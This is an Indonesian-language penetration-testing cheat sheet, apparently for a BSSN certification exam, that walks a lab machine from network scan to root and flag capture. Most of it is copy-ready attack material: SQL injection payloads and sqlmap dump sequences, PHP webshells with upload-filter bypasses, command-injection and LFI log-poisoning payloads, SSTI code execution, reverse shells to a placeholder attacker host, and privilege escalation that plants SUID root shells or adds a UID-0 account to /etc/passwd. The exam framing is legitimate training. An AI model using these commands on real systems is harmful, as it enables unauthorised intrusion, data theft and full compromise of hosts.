# Pentest Closed-Book Cheat Sheet
> **Playbook ujian: Target → Foothold → Root → FLAG**  
> Untuk persiapan Sertifikasi Pentester BSSN

---

# 0. Alur Utama yang Harus Dihafal

```text
DISCOVER
   ↓
SCAN
   ↓
ENUMERATE SERVICE / WEB
   ↓
IDENTIFY VULNERABILITY
   ↓
INITIAL FOOTHOLD / RCE
   ↓
REVERSE SHELL
   ↓
STABILIZE TTY
   ↓
LOCAL ENUMERATION
   ↓
PRIVILEGE ESCALATION
   ↓
ROOT
   ↓
FIND FLAG
   ↓
PROOF
```

## Prinsip setiap tahap

```text
Temukan → Konfirmasi → Eksploitasi → Verifikasi → Catat
```

Jangan menjalankan semua command secara acak. Setiap command harus menjawab pertanyaan berikut:

```text
1. Apa yang tersedia?
2. Apa yang rentan atau salah konfigurasi?
3. Bagaimana mengonfirmasinya?
4. Bagaimana mengubah temuan menjadi akses?
5. Apakah akses tersebut benar-benar berhasil?
```

---

# 1. Variabel Kerja

Gunakan variabel agar command lebih mudah diketik dan mengurangi kesalahan.

```bash
TARGET="192.168.56.118"
LHOST="192.168.56.101"
LPORT="4444"
PORT="8080"
WEB="http://$TARGET:$PORT"
```

Verifikasi:

```bash
echo "$TARGET"
echo "$LHOST"
echo "$WEB"
```

## Arti variabel

| Variabel | Arti |
|---|---|
| `TARGET` | IP mesin target |
| `LHOST` | IP Kali yang dapat dijangkau target |
| `LPORT` | port listener reverse shell |
| `PORT` | port aplikasi target |
| `WEB` | base URL aplikasi |

---

# 2. Tahap 1 — Discover Target

## 2.1 Cek IP dan interface Kali

```bash
ip a
hostname -I
ip route
```

## 2.2 Temukan host aktif

```bash
sudo netdiscover -r 192.168.56.0/24
```

Alternatif:

```bash
nmap -sn 192.168.56.0/24
```

---

# 3. Tahap 2 — Port Scanning


```bash
nmap -sC -sV -p- "$TARGET"
```

## Arti opsi

| Opsi | Fungsi |
|---|---|
| `-p-` | scan port 1–65535 |
| `-sC` | default NSE scripts |
| `-sV` | deteksi versi service |

## Interpretasi cepat

| Port | Service umum | Langkah berikutnya |
|---:|---|---|
| 21 | FTP | anonymous login, file, credential |
| 22 | SSH | credential reuse, private key |
| 80/443 | HTTP/HTTPS | web enumeration |
| 8000/8080/8081 | web/Tomcat | web enumeration, manager panel |
| 3306 | MySQL | credential, local-only DB |
| 5432 | PostgreSQL | credential, local-only DB |
| 8009 | AJP | Tomcat/AJP check |
| 10000 | Webmin | version and credential check |

---

# 4. Tahap 3 — Service Enumeration

Tidak semua target adalah web. Pilih jalur berdasarkan service.

## 4.1 HTTP/HTTPS

```bash
curl -I "$WEB"
curl -s "$WEB"
```

Cek teknologi:

```bash
whatweb "$WEB"
```

Cek robots:

```bash
curl -s "$WEB/robots.txt"
```

## 4.2 FTP

```bash
ftp "$TARGET"
```

Coba anonymous pada lab:

```text
Username: anonymous
Password: anonymous
```

## 4.3 SSH

```bash
ssh <USER>@"$TARGET"
```

Dengan private key:

```bash
chmod 600 id_rsa
ssh -i id_rsa <USER>@"$TARGET"
```

## 4.4 SMB jika tersedia

```bash
smbclient -L //"$TARGET"/ -N
```

```bash
enum4linux -a "$TARGET"
```

## 4.5 Banner sederhana

```bash
nc -nv "$TARGET" <PORT>
```

---

# 5. Tahap 4 — Web Enumeration

## 5.1 Directory brute force

```bash
dirsearch -u "$WEB/"
```

## 5.2 Extension penting

```bash
feroxbuster \
  -u "$WEB/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak,old,zip,sql,conf,env
```

## 5.3 Endpoint bernilai tinggi

```text
/admin
/administrator
/login
/upload
/uploads
/backup
/config
/api
/test
/dev
/robots.txt
/.git
/.env
```

## 5.4 Checklist manual web

```text
[ ] Lihat source HTML
[ ] Cek robots.txt
[ ] Cek cookie/session
[ ] Cari komentar developer
[ ] Catat semua parameter GET
[ ] Tangkap POST dengan Burp
[ ] Cari login, upload, search, page/file, ping/diagnostic
[ ] Cek virtual host dari hostname/banner
```

## 5.5 Pemetaan fungsi ke pengujian

| Fungsi aplikasi | Pengujian utama |
|---|---|
| Login | SQLi, default credential |
| Search/detail `id=` | SQLi, IDOR |
| `page=` atau `file=` | LFI/path traversal |
| Upload avatar/file | unrestricted file upload |
| Ping/diagnostic | command injection |
| Template preview | SSTI |
| Download/export | path traversal, IDOR |

---

# 6. Tahap 5 — Initial Foothold

Tujuan tahap ini:

```text
Input aplikasi → kerentanan → command execution → user layanan
```

Konfirmasi command execution dengan:

```bash
id
whoami
```

User awal umumnya:

```text
www-data
apache
nginx
tomcat
```

---

# 7. SQL Injection

## 7.1 Payload auth bypass

```text
' OR '1'='1'-- -
```

```text
admin'-- -
```

```text
') OR ('1'='1
```

## 7.2 Boolean detection

```text
?id=1 AND 1=1
?id=1 AND 1=2
```

Jika hasil berbeda secara konsisten, lanjutkan validasi.

---

## 7.3 SQLMap GET — Urutan 1 sampai 5

Siapkan URL:

```bash
URL="$WEB/page?id=1"
```

### 1. Deteksi SQL Injection

```bash
sqlmap \
  -u "$URL" \
  -p id \
  --batch
```

### 2. Database aktif

```bash
sqlmap \
  -u "$URL" \
  -p id \
  --batch \
  --current-db
```

### 3. Semua database

```bash
sqlmap \
  -u "$URL" \
  -p id \
  --batch \
  --dbs
```

### 4. Tabel pada database

```bash
sqlmap \
  -u "$URL" \
  -p id \
  --batch \
  -D <DATABASE> \
  --tables
```

### 5. Dump tabel

```bash
sqlmap \
  -u "$URL" \
  -p id \
  --batch \
  -D <DATABASE> \
  -T <TABLE> \
  --dump
```

## Versi satu baris GET

```bash
sqlmap -u "$URL" -p id --batch
sqlmap -u "$URL" -p id --batch --current-db
sqlmap -u "$URL" -p id --batch --dbs
sqlmap -u "$URL" -p id --batch -D <DATABASE> --tables
sqlmap -u "$URL" -p id --batch -D <DATABASE> -T <TABLE> --dump
```

---

## 7.4 SQLMap POST Login — Urutan 1 sampai 5

Siapkan:

```bash
LOGIN_URL="$WEB/administrator/"
POST_DATA="username=admin&password=test"
```

### 1. Deteksi SQL Injection

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch
```

### 2. Database aktif

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --current-db
```

### 3. Semua database

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --dbs
```

### 4. Tabel pada database

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D <DATABASE> \
  --tables
```

### 5. Dump tabel

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D <DATABASE> \
  -T <TABLE> \
  --dump
```

## Versi satu baris POST

```bash
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch --current-db
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch --dbs
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch -D <DATABASE> --tables
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch -D <DATABASE> -T <TABLE> --dump
```

---

## 7.5 Request dari Burp

Simpan request sebagai:

```text
request.txt
```

Lalu:

```bash
sqlmap -r request.txt --batch
sqlmap -r request.txt --batch --current-db
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D <DATABASE> --tables
sqlmap -r request.txt --batch -D <DATABASE> -T <TABLE> --dump
```

Jika hanya satu parameter yang diuji:

```bash
sqlmap -r request.txt -p username --batch --dbs
```

## Pola hafalan SQLMap

```text
Deteksi → current-db → dbs → tables → dump
```

```text
GET  : -u "$URL" -p id
POST : -u "$LOGIN_URL" --data="$POST_DATA" -p username
BURP : -r request.txt
```

> Backslash `\` harus menjadi karakter terakhir pada baris. Jangan menambahkan spasi setelah backslash.

---

# 8. File Upload

## 8.1 PHP webshell sederhana

```php
<?php system($_GET['cmd']); ?>
```

Alternatif:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

## 8.2 Variasi extension

```text
shell.php
shell.phtml
shell.php5
shell.phar
shell.php.jpg
shell.jpg.php
shell.pHp
```

## 8.3 Content-Type

Di Burp:

```http
Content-Type: image/jpeg
```

## 8.4 Magic byte sederhana

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

## 8.5 Uji webshell

```bash
curl "$WEB/uploads/shell.php?cmd=id"
```

URL encode command:

```bash
curl -G \
  --data-urlencode "cmd=id" \
  "$WEB/uploads/shell.php"
```

## Decision tree

```text
Upload gagal
└─ Uji extension, MIME, nama file, magic byte

Upload berhasil
├─ Cari lokasi file
├─ Akses file
└─ Jalankan id

Output source PHP
└─ Folder tidak mengeksekusi PHP

Output id
└─ RCE berhasil
```

---

# 9. Command Injection

## 9.1 Separator dasar

```text
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id
```

## 9.2 Blind injection

```text
; sleep 5
```

## 9.3 Callback HTTP

Di Kali:

```bash
python3 -m http.server 8000
```

Payload:

```text
; curl http://<LHOST>:8000/$(whoami)
```

## Urutan hafalan

```text
id → sleep → callback → reverse shell
```

---

# 10. LFI / Path Traversal

## 10.1 Baca `/etc/passwd`

```text
?page=../../../../etc/passwd
```

Bypass sederhana:

```text
?page=....//....//....//etc/passwd
```

## 10.2 PHP filter

```text
?page=php://filter/convert.base64-encode/resource=index.php
```

Decode:

```bash
echo '<BASE64>' | base64 -d
```

## 10.3 File bernilai tinggi

```text
/etc/passwd
/etc/hosts
/proc/self/environ
/var/www/html/config.php
/var/www/html/.env
/home/<USER>/.ssh/id_rsa
```

## 10.4 Log poisoning pada lab

Inject User-Agent:

```bash
curl \
  -A "<?php system(\$_GET['cmd']); ?>" \
  "$WEB/"
```

Include log:

```text
/vuln.php?page=/var/log/apache2/access.log&cmd=id
```

Lokasi umum:

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

---

# 11. SSTI

## 11.1 Deteksi

```text
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
```

Jika tampil `49`, ekspresi diproses template engine.

## 11.2 Jinja2 command execution

```text
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

Alternatif:

```text
{{ lipsum.__globals__['os'].popen('id').read() }}
```

## Alur

```text
Refleksi input → 7*7 = 49 → identifikasi engine
→ id → reverse shell
```

---

# 12. Tahap 6 — Reverse Shell

## 12.1 Listener harus dijalankan lebih dahulu

```bash
nc -lvnp 4444
```

Lebih nyaman:

```bash
rlwrap nc -lvnp 4444
```

## 12.2 Bash reverse shell

```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

## 12.3 Netcat dengan `-e`

```bash
nc -e /bin/bash <LHOST> 4444
```

## 12.4 Netcat FIFO fallback

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
```

## 12.5 Python

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## 12.6 PHP

```bash
php -r '$s=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## 12.7 Msfvenom WAR untuk Tomcat

```bash
msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST=<LHOST> \
  LPORT=4444 \
  -f war \
  -o shell.war
```

## Wajib hafal

```bash
nc -lvnp 4444
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

## Troubleshooting

```text
[ ] Listener aktif?
[ ] LHOST benar?
[ ] LPORT sama?
[ ] Target bisa mengakses Kali?
[ ] Karakter &, >, quote ter-encode?
[ ] Bash/Python/PHP/Netcat tersedia?
```

Tes dari target:

```bash
curl "http://<LHOST>:8000/"
```

Di Kali:

```bash
python3 -m http.server 8000
```

---

# 13. Tahap 7 — Stabilize TTY

## Cara cepat

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Tekan:

```text
Ctrl+Z
```

Di Kali:

```bash
stty raw -echo; fg
```

Tekan Enter, lalu:

```bash
export TERM=xterm
stty rows 40 columns 120
```

Jika terminal rusak:

```bash
reset
```

## Alternatif

```bash
script -qc /bin/bash /dev/null
/bin/sh -i
perl -e 'exec "/bin/sh";'
```

## Wajib hafal

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

# 14. Tahap 8 — Local Enumeration

Tujuan:

```text
Apa yang bisa dijalankan sebagai root?
Apa yang bisa ditulis?
Credential apa yang bocor?
Service internal apa yang tersedia?
Kernel apa yang digunakan?
```

---

## 14.1 Quick Wins — jalankan lebih dahulu

```bash
id; sudo -l
uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d/
```

---

## 14.2 Identitas dan sistem

```bash
id
whoami
hostname
pwd
uname -a
uname -r
cat /etc/os-release
```

---

## 14.3 Sudo

```bash
sudo -l
```

Cari:

```text
NOPASSWD
ALL
binary tertentu
wildcard
LD_PRELOAD
env_keep
```

Pola:

```text
sudo -l → nama binary → GTFOBins → bagian Sudo
```

---

## 14.4 SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

## 14.5 SGID

```bash
find / -perm -2000 -type f 2>/dev/null
```

Prioritaskan binary tidak biasa:

```text
/usr/local/bin
/opt
/home
/tmp
```

---

## 14.6 Capabilities

```bash
getcap -r / 2>/dev/null
```

Temuan penting:

```text
cap_setuid
cap_dac_read_search
cap_dac_override
cap_sys_admin
```

---

## 14.7 Cron

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

Periksa:

```text
- dijalankan sebagai root;
- script writable;
- direktori writable;
- command tanpa absolute path;
- wildcard;
- environment PATH.
```

---

## 14.8 Writable files

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

Cek target tertentu:

```bash
ls -la <FILE>
stat <FILE>
namei -l <FILE>
```

---

## 14.9 Credential hunting

```bash
ls -la /home/*
cat ~/.bash_history
```

```bash
find / -name "*.conf" 2>/dev/null
find / -name "*.ini" 2>/dev/null
find / -name "*.env" 2>/dev/null
find / -name "config.php" 2>/dev/null
```

Cari keyword:

```bash
grep -RniE \
  'password|passwd|secret|token|username|user=' \
  /var/www /opt /home 2>/dev/null
```

Cari private key:

```bash
find /home -name id_rsa -o -name authorized_keys 2>/dev/null
```

---

## 14.10 Internal services

```bash
ss -tlnp
```

Alternatif:

```bash
netstat -tulnp 2>/dev/null
```

Service localhost bernilai tinggi:

```text
127.0.0.1:3306
127.0.0.1:5432
127.0.0.1:8000
127.0.0.1:10000
```

---

## 14.11 Process

```bash
ps aux
```

```bash
ps aux | grep root
```

---

## 14.12 LinPEAS

Di Kali:

```bash
python3 -m http.server 8089
```

Di target:

```bash
wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas-output.txt
```

One-liner:

```bash
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas-output.txt
```

Prioritas membaca output:

```text
1. sudo
2. SUID
3. capabilities
4. cron/script writable
5. credential
6. internal service
7. sensitive file
8. kernel
```

> LinPEAS membantu menemukan kandidat. Temuan tetap harus dikonfirmasi manual.

---

# 15. Tahap 9 — Privilege Escalation

Urutan prioritas:

```text
1. Credential reuse
2. sudo misconfiguration
3. SUID
4. capabilities
5. writable cron/service
6. weak file permission
7. kernel exploit
```

Kernel exploit diletakkan terakhir karena berisiko dan bergantung patch.

---

# 16. PrivEsc melalui Sudo

Cek:

```bash
sudo -l
```

## Contoh umum

```bash
sudo env /bin/sh
```

```bash
sudo find . -exec /bin/sh \; -quit
```

```bash
sudo python3 -c 'import os;os.system("/bin/sh")'
```

```bash
sudo vim -c ':!/bin/sh'
```

Less:

```bash
sudo less /etc/profile
```

Di dalam `less`:

```text
!/bin/sh
```

Verifikasi:

```bash
id
```

---

# 17. PrivEsc melalui SUID

Cari:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Contoh:

```bash
env /bin/sh -p
```

```bash
bash -p
```

```bash
find . -exec /bin/sh -p \; -quit
```

```bash
awk 'BEGIN{system("/bin/sh")}'
```

## Ingat

```text
SUID shell → gunakan -p
```

Verifikasi:

```bash
id
```

Target:

```text
uid=0(root)
```

atau:

```text
euid=0(root)
```

---

# 18. PrivEsc melalui Capabilities

Cek:

```bash
getcap -r / 2>/dev/null
```

Contoh Python dengan `cap_setuid=ep`:

```bash
python3 -c 'import os;os.setuid(0);os.execl("/bin/bash","bash","-p")'
```

Verifikasi:

```bash
id
```

---

# 19. PrivEsc melalui Writable Cron

## 19.1 Temukan job

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

## 19.2 Cek permission script

```bash
ls -la /path/to/script.sh
stat /path/to/script.sh
```

## 19.3 Tambah payload pada lab

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/to/script.sh
```

Setelah cron berjalan:

```bash
/tmp/rootbash -p
```

Verifikasi:

```bash
id
```

## Checklist

```text
[ ] Cron dijalankan root
[ ] Script writable
[ ] Job benar-benar aktif
[ ] Payload tidak merusak syntax script
[ ] /tmp/rootbash terbentuk
```

---

# 20. Weak File Permission

## 20.1 Cek file sensitif

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/
```

## 20.2 SSH private key

```bash
cat /home/<USER>/.ssh/id_rsa
```

Di Kali:

```bash
chmod 600 id_rsa
ssh -i id_rsa <USER>@"$TARGET"
```

## 20.3 `/etc/passwd` writable pada lab

Generate hash:

```bash
openssl passwd -1 pass123
```

Tambah user UID 0:

```bash
echo 'labroot:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Login:

```bash
su labroot
```

Verifikasi:

```bash
id
```

---

# 21. Kernel Privilege Escalation

## Cek versi

```bash
uname -r
cat /etc/os-release
```

Cari kandidat:

```bash
searchsploit linux kernel <VERSION>
```

Aturan:

```text
[ ] Cocokkan kernel
[ ] Cocokkan distro
[ ] Cek patch/backport
[ ] Baca source PoC
[ ] Gunakan sumber tepercaya
[ ] Snapshot lab
[ ] Kernel exploit pilihan terakhir
```

---

# 22. Decision Tree PrivEsc

```text
sudo -l ada entry?
├─ Ya → GTFOBins Sudo → exploit → id
└─ Tidak
   │
   ├─ SUID tidak biasa?
   │  ├─ Ya → GTFOBins SUID → shell -p → id
   │  └─ Tidak
   │
   ├─ Capability berbahaya?
   │  ├─ Ya → payload capability → id
   │  └─ Tidak
   │
   ├─ Cron root?
   │  ├─ Script writable → inject → tunggu → id
   │  ├─ PATH hijack → konfirmasi → id
   │  └─ Tidak
   │
   ├─ Credential/key ditemukan?
   │  ├─ Ya → su/ssh → enum ulang
   │  └─ Tidak
   │
   ├─ File sensitif writable/readable?
   │  ├─ Ya → gunakan sesuai temuan → id
   │  └─ Tidak
   │
   └─ Kernel rentan dan terkonfirmasi?
      ├─ Ya → snapshot → exploit → id
      └─ Tidak → ulangi enumeration
```

---

# 23. Tahap 10 — Verifikasi Root

Jalankan:

```bash
id
whoami
hostname
pwd
```

Target:

```text
uid=0(root)
```

atau:

```text
euid=0(root)
```

## Command ringkas

```bash
id; whoami; hostname; pwd
```

---

# 24. Tahap 11 — Menemukan FLAG

Jangan hanya mencari file bernama `flag.txt`. Nama flag bisa bervariasi.

## 24.1 Cek lokasi umum

```bash
ls -la /root
ls -la /home
ls -la /home/*
ls -la /var/www
ls -la /opt
ls -la /tmp
```

## 24.2 Cari berdasarkan nama

```bash
find / -type f -iname "flag*" 2>/dev/null
```

## 24.3 Cari pola umum CTF

```bash
grep -RniE \
  'flag\{|FLAG\{|THM\{|HTB\{|CTF\{' \
  /root /home /var/www /opt 2>/dev/null
```

## 24.4 Cari file teks kecil

```bash
find /root /home /var/www /opt \
  -type f \
  -size -10k \
  2>/dev/null
```

## 24.5 Tampilkan isi flag

```bash
cat /root/root.txt
```

```bash
cat /home/<USER>/user.txt
```

```bash
cat <PATH_FLAG>
```

## 24.6 Jika tidak tahu format

```bash
file <PATH>
strings <PATH>
```

## Urutan pencarian flag

```text
1. /root
2. /home/*
3. /var/www
4. /opt
5. find berdasarkan nama
6. grep pola FLAG
```

---

# 25. Tahap 12 — Proof / Submission

## Bukti minimum

```bash
id
hostname
cat <PATH_FLAG>
```

## Bukti lebih lengkap

```bash
id
whoami
hostname
pwd
date
ls -la <PATH_FLAG>
cat <PATH_FLAG>
```

## Screenshot harus memuat

```text
[ ] uid/euid root
[ ] hostname target
[ ] lokasi flag
[ ] isi flag
[ ] terminal tidak terpotong
```

---

# 26. End-to-End Command Flow

```bash
# =========================================================
# 1. VARIABLES
# =========================================================
TARGET="192.168.56.118"
LHOST="192.168.56.101"
PORT="8080"
WEB="http://$TARGET:$PORT"

# =========================================================
# 2. DISCOVER
# =========================================================
ip a
nmap -sn 192.168.56.0/24

# =========================================================
# 3. SCAN
# =========================================================
nmap -sC -sV -p- "$TARGET"

# =========================================================
# 4. WEB ENUM
# =========================================================
curl -s "$WEB/robots.txt"
dirsearch -u "$WEB/"
feroxbuster -u "$WEB/" -w /usr/share/wordlists/dirb/common.txt

# =========================================================
# 5. TEST FOOTHOLD
# =========================================================
SQLi   : ' OR '1'='1'-- -
LFI    : ?page=../../../../etc/passwd
SSTI   : {{7*7}}
CMDi   : ; id
Upload : <?php system($_GET['cmd']); ?>

# =========================================================
# 6. SQLMAP EXAMPLE
# =========================================================
URL="$WEB/page?id=1"
sqlmap -u "$URL" -p id --batch
sqlmap -u "$URL" -p id --batch --current-db
sqlmap -u "$URL" -p id --batch --dbs
sqlmap -u "$URL" -p id --batch -D <DATABASE> --tables
sqlmap -u "$URL" -p id --batch -D <DATABASE> -T <TABLE> --dump

# =========================================================
# 7. LISTENER
# =========================================================
rlwrap nc -lvnp 4444

# =========================================================
# 8. REVERSE SHELL
# =========================================================
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'

# =========================================================
# 9. TTY
# =========================================================
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# =========================================================
# 10. LOCAL ENUM
# =========================================================
id; sudo -l
uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d/
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /home/*; cat ~/.bash_history
ss -tlnp

# =========================================================
# 11. PRIVESC
# =========================================================
# Priority:
# credential → sudo → SUID → capability → cron
# → weak permission → kernel

# =========================================================
# 12. VERIFY ROOT
# =========================================================
id; whoami; hostname; pwd

# =========================================================
# 13. FIND FLAG
# =========================================================
ls -la /root /home /home/* /var/www /opt 2>/dev/null
find / -type f -iname "flag*" 2>/dev/null

# =========================================================
# 14. PROOF
# =========================================================
id
hostname
cat <PATH_FLAG>
```

---

# 27. Closed-Book 60-Second Recall

```text
1. DISCOVER
   ip a
   nmap -sn subnet

2. SCAN
   nmap -p- --min-rate 5000
   nmap -sC -sV -pPORTS

3. WEB ENUM
   robots.txt
   dirsearch / feroxbuster

4. FOOTHOLD
   SQLi   → ' OR '1'='1'-- -
   LFI    → ../../../../etc/passwd
   SSTI   → {{7*7}}
   CMDi   → ; id
   Upload → PHP webshell

5. SQLMAP
   detect
   current-db
   dbs
   tables
   dump

6. SHELL
   nc -lvnp 4444
   bash reverse shell

7. TTY
   python pty

8. LOCAL ENUM
   id
   sudo -l
   uname
   SUID
   getcap
   cron
   writable
   credential
   ss -tlnp
   linpeas

9. ROOT
   sudo / SUID / cap / cron / credential / kernel

10. FLAG
    find flag, proof.txt, root.txt, user.txt

11. PROOF
    id
    hostname
    cat flag
```

---

## 27.1 Cyber Kill Chain - Jalur Belajar Cepat dari Seluruh VM

### 1. Recon dan Discovery

```text
Cari host aktif
-> scan seluruh port
-> identifikasi service web
-> catat port tidak standar
-> buka semua aplikasi yang terlihat menarik
```

```bash
nmap -sn 192.168.56.0/24
nmap -sC -sV -p- "$TARGET"
whatweb "$WEB"
nikto -h "$WEB"
```

### 2. Enumerasi Aplikasi dan Permukaan Serangan

```text
Cari login admin
-> cari parameter GET/POST
-> cari endpoint page/file
-> cari fitur upload
-> cari fitur diagnostic/monitor/ping/check status
-> cari file sensitif seperti robots, env, db, backup
```

```bash
dirsearch -u "$WEB/"
feroxbuster -u "$WEB/" -x php,txt,bak,old,zip,sql,conf,env
arjun -u "$WEB"
curl -s "$WEB/robots.txt"
curl -s "$WEB/.env"
curl -s "$WEB/db.php"
```

### 3. Weaponization - Payload yang Harus Dikuasai

```text
Untuk login -> siapkan SQLi dasar
Untuk include file -> siapkan traversal/LFI
Untuk command injection -> siapkan separator ;
Untuk upload -> siapkan web shell PHP
Untuk reverse shell -> siapkan listener
```

```text
' OR '1'='1'-- -
../../../../etc/passwd
; id
GIF89a;
<?php system($_GET['cmd']); ?>
```

```bash
nc -lvnp 4444
```

Web shell paling ringkas:

```php
<?php system($_GET['cmd']); ?>
```

Web shell dengan prefix yang sering dipakai saat validasi upload lemah:

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

### 4. Delivery dan Exploitation

```text
Uji SQLi pada login
-> uji LFI pada page/file
-> uji command injection pada fitur monitor/diagnostic
-> jika ada panel admin, lanjut ke upload shell
-> jika LFI valid, pertimbangkan log poisoning untuk RCE
```

Contoh command inti:

```bash
curl -s "$WEB/?page=../../../../etc/passwd"
curl -s "$WEB/?page=../../../../etc/passwd" | grep -E 'root:|www-data|tomcat|petugas'
curl -sG --data-urlencode "cmd=id;whoami;hostname;pwd" "$SHELL_URL"
```

Contoh payload command injection yang wajib hafal:

```text
8.8.8.8; id
8.8.8.8; whoami
8.8.8.8; cat /etc/passwd
8.8.8.8; ls /home
8.8.8.8; sudo -l
```

Pola penting untuk LFI menjadi RCE:

```text
LFI
-> poison /var/log/apache2/access.log
-> include access.log
-> dapat RCE
```

### 5. Initial Access / Foothold

```text
Target minimal foothold:
- akses panel admin
- SSH user valid
- command execution sebagai www-data/tomcat
- reverse shell
```

Validasi foothold:

```bash
id
whoami
hostname
pwd
```

Jika foothold berupa SSH:

```bash
ssh <USER>@"$TARGET"
id
whoami
hostname
pwd
```

Jika foothold berupa reverse shell:

```bash
nc -lvnp 4444
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=/bin/bash
```

### 6. User Flag dan Validasi Akses

```text
Begitu foothold ada:
cek home directory user yang relevan
-> cari user flag
-> baca user flag bila tersedia
-> jangan tunggu sampai root jika user flag sudah terlihat
```

```bash
ls /home
find /home /opt /var/www -type f -iname "*flag*" 2>/dev/null
cat /home/*/flag.txt
```

Jika path user flag sudah diketahui:

```bash
cat /home/tomcat/FLAG.txt
cat /home/monitor/flag.txt
cat /home/petugas/flag.txt
cat /home/pengelola/flag.txt
```

### 7. Local Enumeration

```text
Urutan tercepat:
sudo -l
-> SUID
-> capabilities
-> cron
-> credential hunting
-> internal service
-> kernel terakhir
```

Command inti:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/
grep -RniE 'password|passwd|secret|token' /var/www /opt /home 2>/dev/null
ss -tlnp
uname -a
```

Tambahan yang sering menentukan jalur tercepat:

```bash
ls -la /usr/bin/bash
find / -writable -type f 2>/dev/null | grep -v /proc/
cat /etc/passwd
cat /etc/shadow 2>/dev/null
ps aux
```

### 8. Privilege Escalation - Pola Tercepat dari Seluruh Lab

```text
Jika sudo NOPASSWD ke binary berbahaya
-> gunakan GTFOBins / system() / shell escape

Jika ada SUID bash
-> /usr/bin/bash -p

Jika ada capability cap_setuid
-> python3 -c 'import os; os.setuid(0); ...'

Jika ada writable root cron
-> tanam payload SUID / shell root

Jika kernel rentan dan semua jalur cepat gagal
-> baru pertimbangkan kernel exploit
```

Command penting yang harus benar-benar dikuasai:

```bash
# Sudo ke gawk
sudo -l
sudo /usr/bin/gawk 'BEGIN {system("id")}'
sudo /usr/bin/gawk 'BEGIN {system("whoami")}'
sudo /usr/bin/gawk 'BEGIN {system("find / -type f -name flag.txt 2>/dev/null")}'
sudo /usr/bin/gawk 'BEGIN {system("cat /root/flag.txt")}'

# SUID bash
find / -perm -4000 -type f 2>/dev/null
/usr/bin/bash -p
id
whoami

# Capability Python
getcap -r / 2>/dev/null
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system("id; whoami")'
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system("find / -type f -iname \"*flag*\" 2>/dev/null")'
/usr/bin/python3.13 -c 'import os; os.setuid(0); print(open("/root/flag.txt").read())'

# Writable root cron
cat /etc/crontab
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /path/to/root-cron-script.sh
ls -la /tmp/rootbash
/tmp/rootbash -p
```

Pola prioritas yang perlu tertanam:

```text
sudo NOPASSWD
-> SUID bash
-> capability cap_setuid
-> writable cron
-> weak permission
-> kernel exploit
```

### 9. Root, Flag, dan Proof

```text
Verifikasi uid=0
-> cari root flag
-> baca root flag
-> simpan bukti minimal
```

```bash
id
whoami
find / -type f -iname "*flag*" 2>/dev/null
cat /root/flag.txt
hostname
```

Jika nama file flag tidak pasti:

```bash
find / -type f \( -iname "*flag*" -o -iname "proof.txt" -o -iname "root.txt" -o -iname "user.txt" \) 2>/dev/null
